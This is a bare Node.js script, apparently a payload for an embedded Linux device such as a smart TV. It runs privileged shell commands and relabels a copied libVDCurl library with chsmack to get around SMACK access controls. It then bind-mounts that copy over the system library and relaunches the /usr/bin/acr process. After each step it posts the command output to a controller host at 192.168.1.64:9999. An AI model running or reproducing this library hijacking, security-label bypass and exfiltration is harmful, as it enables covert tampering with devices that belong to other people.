"use strict";
var fs = require("fs");
var http = require("http");
var cp = require("child_process");

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: "192.168.1.64", port: 9999, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { console.log("posted " + path + " -> " + res.statusCode); });
    req.on("error", function (e) { console.log("post error " + e.message); });
    req.write(data);
    req.end();
}
function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 25000 }).slice(0, cap || 2500); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}
var out = {};
out.mounts = sh("grep -E 'tmpfs|/tmp|/dev/shm' /proc/mounts | head -6");
out.fix = sh("chmod 755 /opt/acr-ca/libVDCurl.so.0.9; mkdir -p /tmp/tm; mount -t tmpfs -o size=20m none /tmp/tm 2>&1; cp /opt/acr-ca/libVDCurl.so.0.9 /tmp/tm/libVDCurl.so.0.9 2>&1; chmod 755 /tmp/tm/libVDCurl.so.0.9; chsmack -a _ /tmp/tm/libVDCurl.so.0.9 2>&1; ls -laZ /tmp/tm/");
out.umount_old = sh("umount -l /usr/lib/libVDCurl.so.0.9 2>&1; mount --bind /tmp/tm/libVDCurl.so.0.9 /usr/lib/libVDCurl.so.0.9 2>&1 && echo BIND_OK; md5sum /usr/lib/libVDCurl.so.0.9");
post("/tmpfs_a", out);

setTimeout(function () {
    var o = {};
    try {
        var c = cp.spawn("/usr/bin/acr", [], { detached: true, stdio: "ignore" });
        c.unref();
        o.spawn = "pid=" + c.pid;
    } catch (e) { o.spawn = "ERR " + e.message; }
    post("/tmpfs_b", o);
}, 3000);

setTimeout(function () {
    var o = {};
    o.ps = sh("ps -ef | grep '/usr/bin/acr' | grep -v grep | head -3");
    o.err = sh("tail -2 /tmp/acr.out 2>/dev/null");
    post("/tmpfs_c", o);
}, 9000);
